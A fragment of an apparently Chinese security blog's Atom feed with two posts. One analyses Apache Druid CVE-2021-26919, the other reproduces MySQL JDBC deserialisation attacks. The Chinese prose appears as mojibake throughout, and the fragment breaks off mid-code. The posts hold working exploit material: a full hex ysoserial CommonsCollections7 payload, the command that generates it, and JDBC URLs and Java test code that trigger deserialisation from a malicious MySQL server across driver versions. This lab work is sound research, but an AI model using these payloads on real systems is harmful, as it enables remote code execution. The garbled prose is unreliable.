    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="Jdbc" scheme="http://m0d9.me/tags/Jdbc/"/>
    
    <category term="H2" scheme="http://m0d9.me/tags/H2/"/>
    
    <category term="HSQLDB" scheme="http://m0d9.me/tags/HSQLDB/"/>
    
  </entry>
  
  <entry>
    <title>Apache Druid CVE-2021-26919 æ¼æ´åˆ†æ</title>
    <link href="http://m0d9.me/2021/04/21/Apache-Druid-CVE-2021-26919-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2021/04/21/Apache-Druid-CVE-2021-26919-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-04-21T13:08:00.000Z</published>
    <updated>2021-04-22T07:05:40.589Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2021-26919æ˜¯ä¸€ä¸ªjdbc ååºåˆ—åŒ–ç±»å‹æ¼æ´ï¼Œç”¨ä½œä¹‹å‰ä¸¤ç¯‡jdbc mysqlå­¦ä¹ çš„ç»ƒæ‰‹ï¼Œåˆ†æåˆ†æã€‚</p><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>å·²çŸ¥æ˜¯jdbc mysqlååºåˆ—åŒ–çš„é—®é¢˜ï¼Œå¯ä»¥ç›´æ¥çœ‹çœ‹å®˜æ–¹çš„ä¿®å¤</p><p><a href="https://github.com/apache/druid/compare/druid-0.20.1...druid-0.20.2">https://github.com/apache/druid/compare/druid-0.20.1...druid-0.20.2</a><br><img src="/images/pasted-129.png" alt="upload successful"></p><p>å…·ä½“åœ¨è¿™ä¸ªcommité‡Œ<br><a href="https://github.com/apache/druid/commit/48953e3508967f5156c69676432b5d4dd25ea678">https://github.com/apache/druid/commit/48953e3508967f5156c69676432b5d4dd25ea678</a></p><p>ä»£ç å°±ä¸è´´äº†ï¼Œä¸»è¦åŠŸèƒ½æ˜¯è®¾ç½®äº†jdbc:mysql &amp; jdbc:postgresqlä¸¤ç±»driverå’Œå¯¹åº”çš„å‚æ•°ç™½åå•</p><a id="more"></a><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>çŸ¥é“æ¼æ´ç±»å‹ï¼Œå‰©ä¸‹å°±æ˜¯æ‰¾æ¼æ´è§¦å‘ç‚¹äº†</p><h3 id="jdbcè§¦å‘ç‚¹"><a href="#jdbcè§¦å‘ç‚¹" class="headerlink" title="jdbcè§¦å‘ç‚¹"></a>jdbcè§¦å‘ç‚¹</h3><p>æœ€å¥½çš„æ–¹å¼æ˜¯å¤šè¯»å®˜æ–¹æ–‡æ¡£ï¼Œåœ¨lookupç›¸å…³åŠŸèƒ½æ–‡æ¡£ä¸Šæ‰¾åˆ°<br><a href="https://druid.apache.org/docs/0.19.0/development/extensions-core/druid-lookups.html#polling-lookup">https://druid.apache.org/docs/0.19.0/development/extensions-core/druid-lookups.html#polling-lookup</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;pollingLookup&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;pollPeriod&quot;</span>: <span class="string">&quot;PT10M&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataFetcher&quot;</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;jdbcDataFetcher&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;connectorConfig&quot;</span>: <span class="string">&quot;jdbc://mysql://localhost:3306/my_data_base&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;table&quot;</span>: <span class="string">&quot;lookup_table_name&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;keyColumn&quot;</span>: <span class="string">&quot;key_column_name&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;valueColumn&quot;</span>: <span class="string">&quot;value_column_name&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;cacheFactory&quot;</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;onHeapPolling&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›¸å…³çš„ï¼Œåœ¨web consoleä¸Šä¹Ÿæ‰¾åˆ°å¯¹åº”çš„åŠŸèƒ½ç‚¹</p><p><img src="/images/pasted-130.png" alt="upload successful"></p><h3 id="mysql-connector-java"><a href="#mysql-connector-java" class="headerlink" title="mysql-connector-java"></a>mysql-connector-java</h3><p><a href="https://druid.apache.org/docs/latest/development/extensions-core/lookups-cached-global.html#introspection">https://druid.apache.org/docs/latest/development/extensions-core/lookups-cached-global.html#introspection</a></p><blockquote><p>If using JDBC, you will need to add your databaseâ€™s client JAR files to the extensionâ€™s directory. For Postgres, the connector JAR is already included. For MySQL, you can get it from <a href="https://dev.mysql.com/downloads/connector/j/">https://dev.mysql.com/downloads/connector/j/</a>. Copy or symlink the downloaded file to extensions/druid-lookups-cached-global under the distribution root directory.</p></blockquote><ol><li>éœ€è¦å°†mysql-connector-java sdkæ‹·è´è‡³extensions/druid-lookups-cached-global</li><li>è€Œä¸”éœ€è¦å¯åŠ¨druid-lookups-cached-globalç»„ä»¶ï¼Œå…·ä½“æ“ä½œä¸ºåœ¨common.runtime.propertiesæ–‡ä»¶ä¸­ä¿®æ”¹druid.extensions.loadListï¼Œå¢åŠ â€druid-lookups-cached-globalâ€æ‰©å±•åŠŸèƒ½</li></ol><h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h3><p>libç›®å½•ä¸­æ‰¾åˆ°å‡ ä¸ªå¸¸è§gadgets</p><ol><li><p>commons-collections</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">commons-collections-3.2.2.jar</span><br><span class="line">commons-collections4-4.2.jar</span><br></pre></td></tr></table></figure><p> å®é™…ä¸å¯ç”¨ï¼Œåˆ©ç”¨æ¡ä»¶ä¸ºcc&lt;=3.2.1 æˆ–cc4=4.0ï¼Œå…·ä½“å¯ä»¥çœ‹ysoserial</p></li><li><p>commons-beanutils</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commons-beanutils-1.9.4.jar</span><br></pre></td></tr></table></figure><p> è™½ç„¶ysoserialå†™çš„æ˜¯1.9.2ï¼Œå®æµ‹1.9.4ä¹Ÿå¯ä»¥åˆ©ç”¨</p></li></ol><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;maxAllowedPacket=65535&quot;</span></span><br><span class="line">user =<span class="string">&quot;cb1&quot;</span></span><br><span class="line">password=<span class="string">&quot;password&quot;</span></span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæäº¤ä¹‹åï¼Œéœ€è¦ç­‰ä¸€ä¸¤åˆ†é’Ÿä¹‹åï¼Œæ‰ä¼šè§¦å‘jdbcè¿æ¥</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬æ–‡ç®€å•å¤ç°äº†CVE-2021-26919æ¼æ´ï¼Œæœ¬ä»¥ä¸ºå¾ˆç®€å•ï¼Œç»“æœè¿˜æ˜¯ç”¨äº†å¤§åŠå¤©ï¼Œè¸©äº†ä¸€äº›ä½çº§çš„å‘ï¼Œæ•™è®­æ˜¯å¤šçœ‹æ–‡æ¡£ã€æµ‹è¯•æ’æŸ¥æŒ‰æœ€å°å˜é‡æ¥ã€å¤šçœ‹ç¨‹åºè¾“å‡ºæ—¥å¿—ã€‚ã€‚ã€‚</p><p>æ€»çš„æ¥è¯´è¿™ä¸ªæ¼æ´åˆ©ç”¨åœºæ™¯æ¯”è¾ƒé¸¡è‚‹ï¼Œéœ€è¦åœ¨å¼€å¯jdbcåŠŸèƒ½çš„å‰æä¸‹ï¼ˆsdkæ‹·è´&amp;é…ç½®æ–‡ä»¶ä¸­çš„æ‰©å±•å¼€å¯ï¼‰ã€‚å®˜æ–¹çš„ä¿®å¤ä¹Ÿæ˜¯å½»åº•ï¼Œç›´æ¥é€šè¿‡ç™½åå•åšäº†é™åˆ¶ï¼Œè¿postgresqlä¹Ÿä¸€å¹¶å¤„ç†äº†ï¼Œéš¾é“postgresqlä¹Ÿå­˜åœ¨åˆ©ç”¨ç‚¹ä¸æˆï¼Ÿ</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://help.aliyun.com/noticelist/articleid/1060822985.html?spm=a2c4g.789213612.n2.10.7b5a6141soZJmh">ã€æ¼æ´é¢„è­¦ã€‘Apache Druid è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-26919ï¼‰</a></li><li>[2] <a href="(https://paper.seebug.org/1242/#commonscollections-2">Javaå®‰å…¨ä¹‹ååºåˆ—åŒ–ç¯‡-URLDNS&amp;Commons Collections 1-7ååºåˆ—åŒ–é“¾åˆ†æ</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;CVE-2021-26919æ˜¯ä¸€ä¸ªjdbc ååºåˆ—åŒ–ç±»å‹æ¼æ´ï¼Œç”¨ä½œä¹‹å‰ä¸¤ç¯‡jdbc mysqlå­¦ä¹ çš„ç»ƒæ‰‹ï¼Œåˆ†æåˆ†æã€‚&lt;/p&gt;
&lt;h2 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;å·²çŸ¥æ˜¯jdbc mysqlååºåˆ—åŒ–çš„é—®é¢˜ï¼Œå¯ä»¥ç›´æ¥çœ‹çœ‹å®˜æ–¹çš„ä¿®å¤&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/apache/druid/compare/druid-0.20.1...druid-0.20.2&quot;&gt;https://github.com/apache/druid/compare/druid-0.20.1...druid-0.20.2&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;/images/pasted-129.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;p&gt;å…·ä½“åœ¨è¿™ä¸ªcommité‡Œ&lt;br&gt;&lt;a href=&quot;https://github.com/apache/druid/commit/48953e3508967f5156c69676432b5d4dd25ea678&quot;&gt;https://github.com/apache/druid/commit/48953e3508967f5156c69676432b5d4dd25ea678&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä»£ç å°±ä¸è´´äº†ï¼Œä¸»è¦åŠŸèƒ½æ˜¯è®¾ç½®äº†jdbc:mysql &amp;amp; jdbc:postgresqlä¸¤ç±»driverå’Œå¯¹åº”çš„å‚æ•°ç™½åå•&lt;/p&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´åˆ†æ" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="Druid" scheme="http://m0d9.me/tags/Druid/"/>
    
    <category term="Apache" scheme="http://m0d9.me/tags/Apache/"/>
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Jdbc ç¢ç¢å¿µäºŒï¼šMySQL ååºåˆ—åŒ–</title>
    <link href="http://m0d9.me/2021/04/20/Jdbc-%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%BA%8C%EF%BC%9AMySQL-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://m0d9.me/2021/04/20/Jdbc-%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%BA%8C%EF%BC%9AMySQL-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-04-20T08:08:00.000Z</published>
    <updated>2021-04-21T12:52:26.359Z</updated>
    
    <content type="html"><![CDATA[<p>å‚è€ƒã€1ã€‘ä¸­å››å“¥å·²ç»è®²çš„å¾ˆå…¨é¢ä¹Ÿå¾ˆè¯¦ç»†äº†ï¼Œç®€å•è®°å½•ä¸‹å¤ç°è¿‡ç¨‹å§</p><h2 id="MySQL-ååºåˆ—åŒ–"><a href="#MySQL-ååºåˆ—åŒ–" class="headerlink" title="MySQL ååºåˆ—åŒ–"></a>MySQL ååºåˆ—åŒ–</h2><h3 id="autoDeserialize"><a href="#autoDeserialize" class="headerlink" title="autoDeserialize"></a>autoDeserialize</h3><p><img src="/images/pasted-125.png" alt="upload successful"></p><p>å¦‚è§£é‡Šï¼Œmysql clientä¼šè‡ªåŠ¨ååºåˆ—åŒ–serverç«¯ä¼ å›çš„BLOBç±»å‹</p><a id="more"></a><h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><h4 id="æ‰‹åŠ¨è§¦å‘"><a href="#æ‰‹åŠ¨è§¦å‘" class="headerlink" title="æ‰‹åŠ¨è§¦å‘"></a>æ‰‹åŠ¨è§¦å‘</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> test.eviltable</span><br><span class="line">(</span><br><span class="line"><span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">evil_2  <span class="built_in">blob</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> @obj=<span class="number">0xaced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000e746f756368202f746d702f636337740004657865637571007e00170000000171007e001c7371007e000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d0000000278</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test.eviltable(<span class="string">`evil_2`</span>) <span class="keyword">VALUES</span> (@obj);</span><br></pre></td></tr></table></figure><!--more--><p>å…¶ä¸­@objå–å€¼</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 <span class="string">&quot;touch /tmp/cc7&quot;</span> | xxd -ps -c 200 | tr -d <span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure><p>è§¦å‘ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ResultSet rs = stmt.executeQuery(<span class="string">&quot;select evil_2 from eviltable limit 1;&quot;</span>);</span><br><span class="line">rs.next();</span><br><span class="line">rs.getObject(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>è¯¯åŒºï¼šæƒ³å½“ç„¶ä»¥ä¸ºåªè¦æ˜¯BLOBç±»å‹çš„å­—æ®µå°±ä¼šè¢«è‡ªåŠ¨ååºåˆ—åŒ–ï¼Œå…¶å®ä¸ç„¶ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶</p><ol><li>autoDeserialize ä¸ºTrue</li><li>ä¸»åŠ¨è°ƒç”¨com.mysql.cj.jdbc.result.ResultSetImpl#getObjectï¼Œè¿›è¡Œååºåˆ—åŒ–</li></ol><h3 id="ServerStatusDiffInterceptor-amp-detectCustomCollationsè§¦å‘è°ƒç”¨é“¾"><a href="#ServerStatusDiffInterceptor-amp-detectCustomCollationsè§¦å‘è°ƒç”¨é“¾" class="headerlink" title="ServerStatusDiffInterceptor&amp; detectCustomCollationsè§¦å‘è°ƒç”¨é“¾"></a>ServerStatusDiffInterceptor&amp; detectCustomCollationsè§¦å‘è°ƒç”¨é“¾</h3><p>æ‰‹åŠ¨è§¦å‘åœºæ™¯ä¸‹å®é™…éœ€è¦æ§åˆ¶ï¼š</p><ol><li>jdbc urlï¼Œä¹Ÿå°±æ˜¯evil mysql server</li><li>ä»£ç éœ€è¦getObjectï¼Œè¿™ç‚¹æ˜¾ç„¶ä¸å¯èƒ½</li></ol><p>é‚£ä¹ˆéœ€è¦æ‰¾åˆ°åˆ©ç”¨é“¾ï¼Œè§£å†³è§¦å‘getObjectã€‚å¯ä»¥çœ‹çœ‹å››å“¥åœ¨å‚è€ƒã€1ã€‘ä¸­æ€»ç»“çš„æ¼æ´å†å²ï¼Œæ€»çš„æ¥è¯´æœ‰å…¬å¼€ä¸¤ç§é€šç”¨çš„åˆ©ç”¨æ–¹å¼</p><ul><li>ServerStatusDiffInterceptor</li><li>detectCustomCollations</li></ul><p>å››å“¥å’Œfnmsdçš„æ–‡ç« å·²ç»è®²çš„å¾ˆæ¸…æ¥šäº†ï¼Œè¿™é‡Œç›´æ¥å¼•ç”¨ä»–ä»¬çš„æµ‹è¯•ç»“æœ</p><h4 id="ServerStatusDiffInterceptor"><a href="#ServerStatusDiffInterceptor" class="headerlink" title="ServerStatusDiffInterceptor"></a>ServerStatusDiffInterceptor</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ServerStatusDiffInterceptorè§¦å‘</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 8.x:jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 8.0.14 æµ‹è¯•æˆåŠŸ</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ServerStatusDiffInterceptorTest8_x</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6.x(å±æ€§åä¸åŒ):jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 6.0.5 æµ‹è¯•é€šè¿‡</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ServerStatusDiffInterceptorTest6_x</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.11åŠä»¥ä¸Šçš„5.xç‰ˆæœ¬ï¼ˆåŒ…åæ²¡æœ‰äº†cjï¼‰:jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 5.1.19 æµ‹è¯•æˆåŠŸ</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ServerStatusDiffInterceptorTest5_1_11TO5_x</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.10åŠä»¥ä¸‹çš„5.1.Xç‰ˆæœ¬ï¼šåŒä¸Šï¼Œä½†æ˜¯éœ€è¦è¿æ¥åæ‰§è¡ŒæŸ¥è¯¢ã€‚</span></span><br><span class="line"><span class="comment">// 5.1.10 æµ‹è¯•æˆåŠŸ</span></span><br><span class="line"><span class="comment">// @<span class="doctag">TODO:</span>5.1.9 æµ‹è¯•å¤±è´¥</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ServerStatusDiffInterceptorTest5_xTO5_1_10</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">    Statement stmt = connection.createStatement();</span><br><span class="line">    ResultSet rs = stmt.executeQuery(<span class="string">&quot;select 1;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.0.x:è¿˜æ²¡æœ‰ServerStatusDiffInterceptorè¿™ä¸ªä¸œè¥¿â”“( Â´âˆ€` )â”</span></span><br></pre></td></tr></table></figure><h4 id="detectCustomCollations"><a href="#detectCustomCollations" class="headerlink" title="detectCustomCollations"></a>detectCustomCollations</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * detectCustomCollationsè§¦å‘</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.29-5.1.40:jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 5.1.29 æµ‹è¯•é€šè¿‡</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">detectCustomCollationsTest5_1_29TO5_1_40</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?useSSL=false&amp;autoDeserialize=true&amp;detectCustomCollations=true&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.28-5.1.19ï¼šjdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 5.1.19 æµ‹è¯•é€šè¿‡</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">detectCustomCollationsTest5_1_19TO5_1_28</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3306/?useSSL=false&amp;autoDeserialize=true&quot;</span>;</span><br><span class="line">    Connection connection = 